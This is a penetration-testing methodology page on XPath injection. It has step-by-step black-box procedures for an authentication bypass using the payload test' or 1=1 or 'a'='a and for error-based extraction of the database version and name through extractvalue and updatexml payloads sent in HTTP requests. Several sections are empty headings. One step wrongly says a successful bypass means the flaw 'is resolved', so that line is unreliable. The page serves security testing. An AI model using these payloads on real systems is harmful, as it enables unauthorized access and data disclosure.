# XPath Injection

## Check List

## Methodology

### Black Box

#### Bypass Authentication via XPath Injection

{% stepper %}
{% step %}
Log in to the target site and complete the authentication process on the site
{% endstep %}

{% step %}
Then, using Burp Suite, intercept the authentication requests and verify that the application is using an XML document to store user information.
{% endstep %}

{% step %}
Fill in the username and password entries on the authentication page Submit the request and track the submitted request
{% endstep %}

{% step %}
Then, in the intercepted request, check whether the parameters sent in the request are in the form of an XPATH structure like

```sql
[UserName/text()='" & Request("UserName") & "' And Password/text()='" & Request("Password") & "']
```
{% endstep %}

{% step %}
Enter a valid value in the password field (`test`)
{% endstep %}

{% step %}
In the username field, inject the following malicious payload

```sql
test' or 1=1 or 'a'='a
```
{% endstep %}

{% step %}
Submit the login request and Observe that the XPath query is modified as follows

```sql
[UserName/text()='test' or 1=1 or 'a'='a' And Password/text()='test']
```
{% endstep %}

{% step %}
If the injected condition 1=1 is true and the authentication is successful, the vulnerability is resolved
{% endstep %}
{% endstepper %}

***

#### XPath Injection via product API

{% stepper %}
{% step %}
Log into the target site and intercept the requests using burp suite
{% endstep %}

{% step %}
Then look for APIs for products that have database-like parameters, such as the getcolumns parameter

```http
GET /api/product.php?parent_callid=[VALUE]&callid=[VALUE]&getcolumns=
```
{% endstep %}

{% step %}
Send a normal request to confirm the endpoint responds successfully without any errors
{% endstep %}

{% step %}
Modify the `getcolumns` parameter by injecting the following payload to trigger an XPath error-based SQL injection

```sql
extractvalue(1,concat(0x7e,version()))
```
{% endstep %}

{% step %}
Send the following HTTP request

```http
GET /api/product.php?parent_callid=mobile&callid=123&getcolumns=extractvalue(1,concat(0x7e,version()))
```
{% endstep %}

{% step %}
Observe that the server returns an error message containing the database version in the XPath syntax error response
{% endstep %}

{% step %}
Modify the `getcolumns` parameter again using the following payload to extract the current database name

```sql
updatexml(1,concat(0x7e,database()),1)
```
{% endstep %}

{% step %}
Send the following HTTP request

```sql
GET /api/product.php?parent_callid=mobile&callid=123&getcolumns=updatexml(1,concat(0x7e,database()),1)
```
{% endstep %}

{% step %}
Observe that the server returns an XPath syntax error message disclosing the current database name
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
